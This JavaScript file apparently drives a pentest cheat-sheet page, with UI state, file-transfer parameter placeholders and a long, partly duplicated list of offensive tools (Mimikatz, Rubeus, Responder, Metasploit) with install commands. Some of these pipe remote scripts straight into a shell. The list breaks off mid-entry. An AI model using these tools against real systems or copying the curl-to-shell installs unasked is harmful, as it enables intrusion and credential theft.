let currentPhase = null;
let parameters = {};
let phases = {};
let currentContent = '';
let checkboxStates = new Map();
let filteredParameters = null;
let activeCodeBlock = null;
let activeCodeBlockIndex = null;
let codeBlockParamMap = [];
let outsideClickListenerAttached = false;
let suppressParamPanelRender = false;
let paramSearchTerm = '';
let resetToastTimeout = null;
let codeBlockWrappers = [];
let modalCopyWrappers = [];
let selectionCopyHandlerAttached = false;
let lastCopiedSelection = '';
let lastCopiedWrapper = null;
let lastCopiedAt = 0;
let lastSelectionRect = null;
let allDiscoveredParameters = [];
let initialParamsPromptShown = false;

const CORE_PARAMETER_NAMES = [
    'SENDER_IP',
    'SENDER_PORT',
    'RECEIVER_IP',
    'SENDER_USER',
    'RECEIVER_USER',
    'FILENAME'
];

const CHECKBOX_STORAGE_KEY = 'checkboxStates';
const PARAMS_STORAGE_KEY = 'parameters';
const INITIAL_PARAMS_SKIPPED_KEY = 'initialParamsSkipped';
const PARAM_TOKEN_REGEX = /(<[A-Z_0-9]+>|{{[A-Z_0-9]+}})/g;
const PARAM_MARKER_START = '%%PWN_START%%';
const PARAM_MARKER_END = '%%PWN_END%%';
const PARAM_SEPARATOR = '%%PVAL%%';
const PARAM_SEPARATOR_REGEX = escapeRegex(PARAM_SEPARATOR);

const OS_LABELS = {
    linux: 'Linux',
    windows: 'Windows',
    macos: 'macOS'
};

const OS_ICON_MAP = {
    linux: 'bi-ubuntu',
    windows: 'bi-windows',
    macos: 'bi-apple'
};

const TOOLBOX_ITEMS = [
    // ===== RECONNAISSANCE =====
    {
        name: 'Nmap',
        category: 'Reconnaissance',
        link: 'https://nmap.org',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install nmap -y']
    },
    {
        name: 'Masscan',
        category: 'Reconnaissance',
        link: 'https://github.com/robertdavidgraham/masscan',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install masscan -y']
    },
    {
        name: 'Rustscan',
        category: 'Reconnaissance',
        link: 'https://github.com/RustScan/RustScan',
        linkLabel: 'GitHub',
        installation: [
            'wget https://github.com/RustScan/RustScan/releases/download/2.1.1/rustscan_2.1.1_amd64.deb',
            'sudo dpkg -i rustscan_2.1.1_amd64.deb'
        ]
    },
    {
        name: 'Amass',
        category: 'Reconnaissance',
        link: 'https://github.com/owasp-amass/amass',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install amass -y']
    },
    {
        name: 'Subfinder',
        category: 'Reconnaissance',
        link: 'https://github.com/projectdiscovery/subfinder',
        linkLabel: 'GitHub',
        installation: ['go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest']
    },
    {
        name: 'Assetfinder',
        category: 'Reconnaissance',
        link: 'https://github.com/tomnomnom/assetfinder',
        linkLabel: 'GitHub',
        installation: ['go install github.com/tomnomnom/assetfinder@latest']
    },
    {
        name: 'Findomain',
        category: 'Reconnaissance',
        link: 'https://github.com/Findomain/Findomain',
        linkLabel: 'GitHub',
        installation: [
            'wget https://github.com/Findomain/Findomain/releases/latest/download/findomain-linux',
            'chmod +x findomain-linux'
        ]
    },
    {
        name: 'Shodan CLI',
        category: 'Reconnaissance',
        link: 'https://github.com/achillean/shodan-python',
        linkLabel: 'GitHub',
        installation: ['pip3 install shodan']
    },
    {
        name: 'theHarvester',
        category: 'Reconnaissance',
        link: 'https://github.com/laramies/theHarvester',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install theharvester -y']
    },
    {
        name: 'Recon-ng',
        category: 'Reconnaissance',
        link: 'https://github.com/lanmaster53/recon-ng',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install recon-ng -y']
    },
    {
        name: 'DNSRecon',
        category: 'Reconnaissance',
        link: 'https://github.com/darkoperator/dnsrecon',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install dnsrecon -y']
    },
    {
        name: 'DNSenum',
        category: 'Reconnaissance',
        link: 'https://github.com/fwaeytens/dnsenum',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install dnsenum -y']
    },
    {
        name: 'Fierce',
        category: 'Reconnaissance',
        link: 'https://github.com/mschwager/fierce',
        linkLabel: 'GitHub',
        installation: ['pip3 install fierce']
    },
    {
        name: 'Snmpwalk',
        category: 'Reconnaissance',
        link: 'https://linux.die.net/man/1/snmpwalk',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install -y snmp snmpd']
    },
    {
        name: 'Naabu',
        category: 'Reconnaissance',
        link: 'https://github.com/projectdiscovery/naabu',
        linkLabel: 'GitHub',
        installation: ['go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest']
    },
    {
        name: 'Httpx',
        category: 'Reconnaissance',
        link: 'https://github.com/projectdiscovery/httpx',
        linkLabel: 'GitHub',
        installation: ['go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest']
    },
    {
        name: 'Katana',
        category: 'Reconnaissance',
        link: 'https://github.com/projectdiscovery/katana',
        linkLabel: 'GitHub',
        installation: ['go install github.com/projectdiscovery/katana/cmd/katana@latest']
    },
    {
        name: 'GAU (Get All URLs)',
        category: 'Reconnaissance',
        link: 'https://github.com/lc/gau',
        linkLabel: 'GitHub',
        installation: ['go install github.com/lc/gau/v2/cmd/gau@latest']
    },
    {
        name: 'Waybackurls',
        category: 'Reconnaissance',
        link: 'https://github.com/tomnomnom/waybackurls',
        linkLabel: 'GitHub',
        installation: ['go install github.com/tomnomnom/waybackurls@latest']
    },
    {
        name: 'Arjun',
        category: 'Reconnaissance',
        link: 'https://github.com/s0md3v/Arjun',
        linkLabel: 'GitHub',
        installation: ['pip3 install arjun']
    },
    {
        name: 'ParamSpider',
        category: 'Reconnaissance',
        link: 'https://github.com/devanshbatham/ParamSpider',
        linkLabel: 'GitHub',
        installation: [
            'git clone https://github.com/devanshbatham/ParamSpider',
            'cd ParamSpider && pip3 install -r requirements.txt'
        ]
    },

    // ===== WEB TESTING =====
    {
        name: 'Gobuster',
        category: 'Web Testing',
        link: 'https://github.com/OJ/gobuster',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install gobuster -y']
    },
    {
        name: 'Ffuf',
        category: 'Web Testing',
        link: 'https://github.com/ffuf/ffuf',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install ffuf -y']
    },
    {
        name: 'Feroxbuster',
        category: 'Web Testing',
        link: 'https://github.com/epi052/feroxbuster',
        linkLabel: 'GitHub',
        installation: ['curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash']
    },
    {
        name: 'Dirsearch',
        category: 'Web Testing',
        link: 'https://github.com/maurosoria/dirsearch',
        linkLabel: 'GitHub',
        installation: [
            'git clone https://github.com/maurosoria/dirsearch.git',
            'cd dirsearch && pip3 install -r requirements.txt'
        ]
    },
    {
        name: 'Wfuzz',
        category: 'Web Testing',
        link: 'https://github.com/xmendez/wfuzz',
        linkLabel: 'GitHub',
        installation: ['pip3 install wfuzz']
    },
    {
        name: 'Burp Suite',
        category: 'Web Testing',
        link: 'https://portswigger.net/burp',
        linkLabel: 'Website',
        installation: ['sudo snap install burpsuite --classic']
    },
    {
        name: 'OWASP ZAP',
        category: 'Web Testing',
        link: 'https://www.zaproxy.org',
        linkLabel: 'Website',
        installation: ['sudo snap install zaproxy --classic']
    },
    {
        name: 'Nikto',
        category: 'Web Testing',
        link: 'https://github.com/sullo/nikto',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install nikto -y']
    },
    {
        name: 'WPScan',
        category: 'Web Testing',
        link: 'https://github.com/wpscanteam/wpscan',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install wpscan -y']
    },
    {
        name: 'SQLMap',
        category: 'Web Testing',
        link: 'https://github.com/sqlmapproject/sqlmap',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install sqlmap -y']
    },
    {
        name: 'XSStrike',
        category: 'Web Testing',
        link: 'https://github.com/s0md3v/XSStrike',
        linkLabel: 'GitHub',
        installation: [
            'git clone https://github.com/s0md3v/XSStrike.git',
            'cd XSStrike && pip3 install -r requirements.txt'
        ]
    },
    {
        name: 'Dalfox',
        category: 'Web Testing',
        link: 'https://github.com/hahwul/dalfox',
        linkLabel: 'GitHub',
        installation: ['go install github.com/hahwul/dalfox/v2@latest']
    },
    {
        name: 'Commix',
        category: 'Web Testing',
        link: 'https://github.com/commixproject/commix',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install commix -y']
    },
    {
        name: 'NoSQLMap',
        category: 'Web Testing',
        link: 'https://github.com/codingo/NoSQLMap',
        linkLabel: 'GitHub',
        installation: [
            'git clone https://github.com/codingo/NoSQLMap.git',
            'cd NoSQLMap && pip3 install -r requirements.txt'
        ]
    },
    {
        name: 'JWT_Tool',
        category: 'Web Testing',
        link: 'https://github.com/ticarpi/jwt_tool',
        linkLabel: 'GitHub',
        installation: [
            'git clone https://github.com/ticarpi/jwt_tool',
            'cd jwt_tool && pip3 install -r requirements.txt'
        ]
    },
    {
        name: 'SSRF-Sheriff',
        category: 'Web Testing',
        link: 'https://github.com/teknogeek/ssrf-sheriff',
        linkLabel: 'GitHub',
        installation: ['pip3 install ssrf-sheriff']
    },
    {
        name: 'SSRFmap',
        category: 'Web Testing',
        link: 'https://github.com/swisskyrepo/SSRFmap',
        linkLabel: 'GitHub',
        installation: [
            'git clone https://github.com/swisskyrepo/SSRFmap',
            'cd SSRFmap && pip3 install -r requirements.txt'
        ]
    },
    {
        name: 'Wapiti',
        category: 'Web Testing',
        link: 'https://github.com/wapiti-scanner/wapiti',
        linkLabel: 'GitHub',
        installation: ['pip3 install wapiti3']
    },
    {
        name: 'Arachni',
        category: 'Web Testing',
        link: 'https://github.com/Arachni/arachni',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/Arachni/arachni/releases/latest']
    },
    {
        name: 'Joomscan',
        category: 'Web Testing',
        link: 'https://github.com/OWASP/joomscan',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install joomscan -y']
    },
    {
        name: 'Droopescan',
        category: 'Web Testing',
        link: 'https://github.com/SamJoan/droopescan',
        linkLabel: 'GitHub',
        installation: ['pip3 install droopescan']
    },
    {
        name: 'Eyewitness',
        category: 'Web Testing',
        link: 'https://github.com/FortyNorthSecurity/EyeWitness',
        linkLabel: 'GitHub',
        installation: [
            'git clone https://github.com/FortyNorthSecurity/EyeWitness.git',
            'cd EyeWitness/Python/setup && ./setup.sh'
        ]
    },
    {
        name: 'Aquatone',
        category: 'Web Testing',
        link: 'https://github.com/michenriksen/aquatone',
        linkLabel: 'GitHub',
        installation: [
            'wget https://github.com/michenriksen/aquatone/releases/latest/download/aquatone_linux_amd64_1.7.0.zip',
            'unzip aquatone_linux_amd64_1.7.0.zip'
        ]
    },

    // ===== VULNERABILITY SCANNING =====
    {
        name: 'Nuclei',
        category: 'Vulnerability Scanning',
        link: 'https://github.com/projectdiscovery/nuclei',
        linkLabel: 'GitHub',
        installation: ['go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest']
    },
    {
        name: 'OpenVAS',
        category: 'Vulnerability Scanning',
        link: 'https://www.openvas.org',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install openvas -y']
    },
    {
        name: 'Nessus',
        category: 'Vulnerability Scanning',
        link: 'https://www.tenable.com/products/nessus',
        linkLabel: 'Website',
        installation: ['Download from website']
    },
    {
        name: 'Trivy',
        category: 'Vulnerability Scanning',
        link: 'https://github.com/aquasecurity/trivy',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install trivy -y']
    },
    {
        name: 'Lynis',
        category: 'Vulnerability Scanning',
        link: 'https://github.com/CISOfy/lynis',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install lynis -y']
    },
    {
        name: 'Vuls',
        category: 'Vulnerability Scanning',
        link: 'https://github.com/future-architect/vuls',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/future-architect/vuls/releases/latest']
    },

    // ===== EXPLOITATION =====
    {
        name: 'Metasploit',
        category: 'Exploitation',
        link: 'https://github.com/rapid7/metasploit-framework',
        linkLabel: 'GitHub',
        installation: ['curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall | sh']
    },
    {
        name: 'Exploit-DB Searchsploit',
        category: 'Exploitation',
        link: 'https://github.com/offensive-security/exploitdb',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install exploitdb -y']
    },
    {
        name: 'Exploit-DB',
        category: 'Exploitation',
        link: 'https://www.exploit-db.com',
        linkLabel: 'Website',
        installation: ['searchsploit -u']
    },
    {
        name: 'AutoSploit',
        category: 'Exploitation',
        link: 'https://github.com/NullArray/AutoSploit',
        linkLabel: 'GitHub',
        installation: [
            'git clone https://github.com/NullArray/AutoSploit.git',
            'cd AutoSploit && pip3 install -r requirements.txt'
        ]
    },

    // ===== PASSWORD CRACKING =====
    {
        name: 'John the Ripper',
        category: 'Password Cracking',
        link: 'https://github.com/openwall/john',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install john -y']
    },
    {
        name: 'Hashcat',
        category: 'Password Cracking',
        link: 'https://github.com/hashcat/hashcat',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install hashcat -y']
    },
    {
        name: 'Hydra',
        category: 'Password Cracking',
        link: 'https://github.com/vanhauser-thc/thc-hydra',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install hydra -y']
    },
    {
        name: 'Medusa',
        category: 'Password Cracking',
        link: 'https://github.com/jmk-foofus/medusa',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install medusa -y']
    },
    {
        name: 'Patator',
        category: 'Password Cracking',
        link: 'https://github.com/lanjelot/patator',
        linkLabel: 'GitHub',
        installation: ['pip3 install patator']
    },
    {
        name: 'CrackStation',
        category: 'Password Cracking',
        link: 'https://crackstation.net',
        linkLabel: 'Website',
        installation: ['Online service']
    },
    {
        name: 'Ophcrack',
        category: 'Password Cracking',
        link: 'https://ophcrack.sourceforge.io',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install ophcrack -y']
    },
    {
        name: 'RainbowCrack',
        category: 'Password Cracking',
        link: 'http://project-rainbowcrack.com',
        linkLabel: 'Website',
        installation: ['Download from website']
    },
    {
        name: 'Cain and Abel',
        category: 'Password Cracking',
        link: 'https://www.oxid.it/cain.html',
        linkLabel: 'Website',
        installation: ['Windows only - download from website']
    },
    {
        name: 'Hashid',
        category: 'Password Cracking',
        link: 'https://github.com/psypanda/hashID',
        linkLabel: 'GitHub',
        installation: ['pip3 install hashid']
    },
    {
        name: 'Haiti',
        category: 'Password Cracking',
        link: 'https://github.com/noraj/haiti',
        linkLabel: 'GitHub',
        installation: ['gem install haiti-hash']
    },

    // ===== ACTIVE DIRECTORY =====
    {
        name: 'BloodHound',
        category: 'Active Directory',
        link: 'https://github.com/BloodHoundAD/BloodHound',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install bloodhound -y']
    },
    {
        name: 'SharpHound',
        category: 'Active Directory',
        link: 'https://github.com/BloodHoundAD/SharpHound',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe']
    },
    {
        name: 'Impacket',
        category: 'Active Directory',
        link: 'https://github.com/fortra/impacket',
        linkLabel: 'GitHub',
        installation: [
            'python3 -m pip install --upgrade pip',
            'python3 -m pip install impacket'
        ]
    },
    {
        name: 'CrackMapExec',
        category: 'Active Directory',
        link: 'https://github.com/byt3bl33d3r/CrackMapExec',
        linkLabel: 'GitHub',
        installation: ['pipx install crackmapexec']
    },
    {
        name: 'NetExec',
        category: 'Active Directory',
        link: 'https://github.com/Pennyw0rth/NetExec',
        linkLabel: 'GitHub',
        installation: ['pipx install git+https://github.com/Pennyw0rth/NetExec']
    },
    {
        name: 'Rubeus',
        category: 'Active Directory',
        link: 'https://github.com/GhostPack/Rubeus',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe']
    },
    {
        name: 'Mimikatz',
        category: 'Active Directory',
        link: 'https://github.com/gentilkiwi/mimikatz',
        linkLabel: 'GitHub',
        installation: [
            'wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip',
            'unzip mimikatz_trunk.zip'
        ]
    },
    {
        name: 'Kerbrute',
        category: 'Active Directory',
        link: 'https://github.com/ropnop/kerbrute',
        linkLabel: 'GitHub',
        installation: [
            'wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64',
            'chmod +x kerbrute_linux_amd64'
        ]
    },
    {
        name: 'Evil-WinRM',
        category: 'Active Directory',
        link: 'https://github.com/Hackplayers/evil-winrm',
        linkLabel: 'GitHub',
        installation: ['sudo gem install evil-winrm']
    },
    {
        name: 'PowerView',
        category: 'Active Directory',
        link: 'https://github.com/PowerShellMafia/PowerSploit',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/PowerShellMafia/PowerSploit.git']
    },
    {
        name: 'Invoke-Obfuscation',
        category: 'Active Directory',
        link: 'https://github.com/danielbohannon/Invoke-Obfuscation',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/danielbohannon/Invoke-Obfuscation.git']
    },
    {
        name: 'PowerUp',
        category: 'Active Directory',
        link: 'https://github.com/PowerShellMafia/PowerSploit',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/PowerShellMafia/PowerSploit.git']
    },
    {
        name: 'ADRecon',
        category: 'Active Directory',
        link: 'https://github.com/adrecon/ADRecon',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/adrecon/ADRecon.git']
    },
    {
        name: 'ADModule',
        category: 'Active Directory',
        link: 'https://github.com/samratashok/ADModule',
        linkLabel: 'GitHub',
        installation: ['Import-Module ActiveDirectory']
    },
    {
        name: 'Covenant',
        category: 'Active Directory',
        link: 'https://github.com/cobbr/Covenant',
        linkLabel: 'GitHub',
        installation: ['git clone --recurse-submodules https://github.com/cobbr/Covenant']
    },
    {
        name: 'Empire',
        category: 'Active Directory',
        link: 'https://github.com/BC-SECURITY/Empire',
        linkLabel: 'GitHub',
        installation: [
            'git clone https://github.com/BC-SECURITY/Empire.git',
            'cd Empire && ./setup/install.sh'
        ]
    },
    {
        name: 'Pypykatz',
        category: 'Active Directory',
        link: 'https://github.com/skelsec/pypykatz',
        linkLabel: 'GitHub',
        installation: ['pip3 install pypykatz']
    },
    {
        name: 'Kerberoast',
        category: 'Active Directory',
        link: 'https://github.com/nidem/kerberoast',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/nidem/kerberoast.git']
    },

    // ===== POISONING =====
    {
        name: 'Responder',
        category: 'Poisoning',
        link: 'https://github.com/SpiderLabs/Responder',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install responder -y']
    },
    {
        name: 'Bettercap',
        category: 'Poisoning',
        link: 'https://github.com/bettercap/bettercap',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install bettercap -y']
    },
    {
        name: 'Ettercap',
        category: 'Poisoning',
        link: 'https://www.ettercap-project.org',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install ettercap-graphical -y']
    },
    {
        name: 'MITMproxy',
        category: 'Poisoning',
        link: 'https://github.com/mitmproxy/mitmproxy',
        linkLabel: 'GitHub',
        installation: ['pip3 install mitmproxy']
    },
    {
        name: 'ARPSpoof',
        category: 'Poisoning',
        link: 'https://github.com/alobbs/macchanger',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install dsniff -y']
    },

    // ===== PRIVILEGE ESCALATION =====
    {
        name: 'linPEAS',
        category: 'Privilege Escalation',
        link: 'https://github.com/carlospolop/PEASS-ng',
        linkLabel: 'GitHub',
        installation: [
            'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh',
            'chmod +x linpeas.sh'
        ]
    },
    {
        name: 'winPEAS',
        category: 'Privilege Escalation',
        link: 'https://github.com/carlospolop/PEASS-ng',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe']
    },
    {
        name: 'Linux Smart Enumeration',
        category: 'Privilege Escalation',
        link: 'https://github.com/diego-treitos/linux-smart-enumeration',
        linkLabel: 'GitHub',
        installation: [
            'wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh',
            'chmod +x lse.sh'
        ]
    },
    {
        name: 'LinEnum',
        category: 'Privilege Escalation',
        link: 'https://github.com/rebootuser/LinEnum',
        linkLabel: 'GitHub',
        installation: [
            'wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh',
            'chmod +x LinEnum.sh'
        ]
    },
    {
        name: 'Windows Exploit Suggester',
        category: 'Privilege Escalation',
        link: 'https://github.com/AonCyberLabs/Windows-Exploit-Suggester',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git']
    },
    {
        name: 'PSPY',
        category: 'Privilege Escalation',
        link: 'https://github.com/DominicBreuker/pspy',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64']
    },
    {
        name: 'Linux Exploit Suggester',
        category: 'Privilege Escalation',
        link: 'https://github.com/mzet-/linux-exploit-suggester',
        linkLabel: 'GitHub',
        installation: ['wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh']
    },
    {
        name: 'BeRoot',
        category: 'Privilege Escalation',
        link: 'https://github.com/AlessandroZ/BeRoot',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/AlessandroZ/BeRoot']
    },
    {
        name: 'Shodan CLI',
        category: 'Reconnaissance',
        link: 'https://github.com/achillean/shodan-python',
        linkLabel: 'GitHub',
        installation: ['pip3 install shodan']
    },
    {
        name: 'theHarvester',
        category: 'Reconnaissance',
        link: 'https://github.com/laramies/theHarvester',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install theharvester -y']
    },
    {
        name: 'Recon-ng',
        category: 'Reconnaissance',
        link: 'https://github.com/lanmaster53/recon-ng',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install recon-ng -y']
    },
    {
        name: 'DNSRecon',
        category: 'Reconnaissance',
        link: 'https://github.com/darkoperator/dnsrecon',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install dnsrecon -y']
    },
    {
        name: 'DNSenum',
        category: 'Reconnaissance',
        link: 'https://github.com/fwaeytens/dnsenum',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install dnsenum -y']
    },
    {
        name: 'Fierce',
        category: 'Reconnaissance',
        link: 'https://github.com/mschwager/fierce',
        linkLabel: 'GitHub',
        installation: ['pip3 install fierce']
    },
    {
        name: 'Snmpwalk',
        category: 'Reconnaissance',
        link: 'https://linux.die.net/man/1/snmpwalk',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install -y snmp snmpd']
    },
    {
        name: 'Naabu',
        category: 'Reconnaissance',
        link: 'https://github.com/projectdiscovery/naabu',
        linkLabel: 'GitHub',
        installation: ['go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest']
    },
    {
        name: 'Httpx',
        category: 'Reconnaissance',
        link: 'https://github.com/projectdiscovery/httpx',
        linkLabel: 'GitHub',
        installation: ['go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest']
    },
    {
        name: 'Katana',
        category: 'Reconnaissance',
        link: 'https://github.com/projectdiscovery/katana',
        linkLabel: 'GitHub',
        installation: ['go install github.com/projectdiscovery/katana/cmd/katana@latest']
    },
    {
        name: 'GAU',
        category: 'Reconnaissance',
        link: 'https://github.com/lc/gau',
        linkLabel: 'GitHub',
        installation: ['go install github.com/lc/gau/v2/cmd/gau@latest']
    },
    {
        name: 'Waybackurls',
        category: 'Reconnaissance',
        link: 'https://github.com/tomnomnom/waybackurls',
        linkLabel: 'GitHub',
        installation: ['go install github.com/tomnomnom/waybackurls@latest']
    },
    {
        name: 'Arjun',
        category: 'Reconnaissance',
        link: 'https://github.com/s0md3v/Arjun',
        linkLabel: 'GitHub',
        installation: ['pip3 install arjun']
    },
    {
        name: 'ParamSpider',
        category: 'Reconnaissance',
        link: 'https://github.com/devanshbatham/ParamSpider',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/devanshbatham/ParamSpider', 'cd ParamSpider && pip3 install -r requirements.txt']
    },
    {
        name: 'Censys CLI',
        category: 'Reconnaissance',
        link: 'https://github.com/censys/censys-python',
        linkLabel: 'GitHub',
        installation: ['pip3 install censys']
    },
    {
        name: 'Sublist3r',
        category: 'Reconnaissance',
        link: 'https://github.com/aboul3la/Sublist3r',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/aboul3la/Sublist3r.git', 'cd Sublist3r && pip3 install -r requirements.txt']
    },
    {
        name: 'Knock',
        category: 'Reconnaissance',
        link: 'https://github.com/guelfoweb/knock',
        linkLabel: 'GitHub',
        installation: ['pip3 install knock']
    },
    {
        name: 'Spiderfoot',
        category: 'Reconnaissance',
        link: 'https://github.com/smicallef/spiderfoot',
        linkLabel: 'GitHub',
        installation: ['pip3 install spiderfoot']
    },
    {
        name: 'Photon',
        category: 'Reconnaissance',
        link: 'https://github.com/s0md3v/Photon',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/s0md3v/Photon.git', 'cd Photon && pip3 install -r requirements.txt']
    },
    {
        name: 'Metagoofil',
        category: 'Reconnaissance',
        link: 'https://github.com/laramies/metagoofil',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/laramies/metagoofil.git', 'cd metagoofil && pip3 install -r requirements.txt']
    },

    // ===== WEB TESTING =====
    {
        name: 'Gobuster',
        category: 'Web Testing',
        link: 'https://github.com/OJ/gobuster',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install gobuster -y']
    },
    {
        name: 'Ffuf',
        category: 'Web Testing',
        link: 'https://github.com/ffuf/ffuf',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install ffuf -y']
    },
    {
        name: 'Feroxbuster',
        category: 'Web Testing',
        link: 'https://github.com/epi052/feroxbuster',
        linkLabel: 'GitHub',
        installation: ['curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash']
    },
    {
        name: 'Dirsearch',
        category: 'Web Testing',
        link: 'https://github.com/maurosoria/dirsearch',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/maurosoria/dirsearch.git', 'cd dirsearch && pip3 install -r requirements.txt']
    },
    {
        name: 'Wfuzz',
        category: 'Web Testing',
        link: 'https://github.com/xmendez/wfuzz',
        linkLabel: 'GitHub',
        installation: ['pip3 install wfuzz']
    },
    {
        name: 'Burp Suite',
        category: 'Web Testing',
        link: 'https://portswigger.net/burp',
        linkLabel: 'Website',
        installation: ['sudo snap install burpsuite --classic']
    },
    {
        name: 'OWASP ZAP',
        category: 'Web Testing',
        link: 'https://www.zaproxy.org',
        linkLabel: 'Website',
        installation: ['sudo snap install zaproxy --classic']
    },
    {
        name: 'Nikto',
        category: 'Web Testing',
        link: 'https://github.com/sullo/nikto',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install nikto -y']
    },
    {
        name: 'WPScan',
        category: 'Web Testing',
        link: 'https://github.com/wpscanteam/wpscan',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install wpscan -y']
    },
    {
        name: 'SQLMap',
        category: 'Web Testing',
        link: 'https://github.com/sqlmapproject/sqlmap',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install sqlmap -y']
    },
    {
        name: 'XSStrike',
        category: 'Web Testing',
        link: 'https://github.com/s0md3v/XSStrike',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/s0md3v/XSStrike.git', 'cd XSStrike && pip3 install -r requirements.txt']
    },
    {
        name: 'Dalfox',
        category: 'Web Testing',
        link: 'https://github.com/hahwul/dalfox',
        linkLabel: 'GitHub',
        installation: ['go install github.com/hahwul/dalfox/v2@latest']
    },
    {
        name: 'Commix',
        category: 'Web Testing',
        link: 'https://github.com/commixproject/commix',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install commix -y']
    },
    {
        name: 'NoSQLMap',
        category: 'Web Testing',
        link: 'https://github.com/codingo/NoSQLMap',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/codingo/NoSQLMap.git', 'cd NoSQLMap && pip3 install -r requirements.txt']
    },
    {
        name: 'JWT_Tool',
        category: 'Web Testing',
        link: 'https://github.com/ticarpi/jwt_tool',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/ticarpi/jwt_tool', 'cd jwt_tool && pip3 install -r requirements.txt']
    },
    {
        name: 'SSRFmap',
        category: 'Web Testing',
        link: 'https://github.com/swisskyrepo/SSRFmap',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/swisskyrepo/SSRFmap', 'cd SSRFmap && pip3 install -r requirements.txt']
    },
    {
        name: 'Wapiti',
        category: 'Web Testing',
        link: 'https://github.com/wapiti-scanner/wapiti',
        linkLabel: 'GitHub',
        installation: ['pip3 install wapiti3']
    },
    {
        name: 'Arachni',
        category: 'Web Testing',
        link: 'https://github.com/Arachni/arachni',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/Arachni/arachni/releases/latest']
    },
    {
        name: 'Joomscan',
        category: 'Web Testing',
        link: 'https://github.com/OWASP/joomscan',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install joomscan -y']
    },
    {
        name: 'Droopescan',
        category: 'Web Testing',
